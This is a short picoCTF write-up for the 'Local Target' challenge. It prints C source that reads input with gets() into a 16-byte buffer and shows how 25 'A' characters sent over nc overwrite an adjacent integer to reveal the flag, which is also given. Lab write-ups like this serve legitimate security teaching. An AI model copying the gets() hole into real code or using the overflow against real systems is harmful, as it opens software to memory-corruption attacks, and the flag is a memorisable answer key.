#Challenge: Local Target

#Objective
1. Downloaded all necessary files
    wget https://artifacts.picoctf.net/c/517/local-target
    wget https://artifacts.picoctf.net/c/517/local-target.c
2. Checked contents of directory
    ls
3. Found local-target and local-target.c files, checked contents of local-target.c 
    nano local-target.c
4. Found functions that give flag when ran
    int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
5. Function gives out flag if input is read as 65; however there is an array with a character limit of 16, tried inputting series of letters to see what numbers come out
    a => 64
    aaaaaaaa => 64
    aaaaaaaaaaaaaaaaaaaaaaaaaaa => 6381921
6. It seems function is vulnerable to buffer overflow attacks, tried using alphabet approach to determine number of bytes needed to overflow buffer
    abcdefghijklmnopqrstuvwxyz => 31353
7. Convereted output to Base with radix 16 using cyberchef
    31353 => 7a79
8. Converted output to ASCII using cyberchef
    7a79 => zy
9. Converted answer 65 to Base with radix 16 using cyberchef
    65 => 41
10. Converted output to ASCII using cyberchef
    41 => A
11. Tried using 25 A inputs in program to overflow buffer with 65
    nc saturn.picoctf.net 54665
    AAAAAAAAAAAAAAAAAAAAAAAAA
12. Extracted flag from output
    flag: picoCTF{l0c4l5_1n_5c0p3_fee8ef05}


#Solution Steps


#Learned
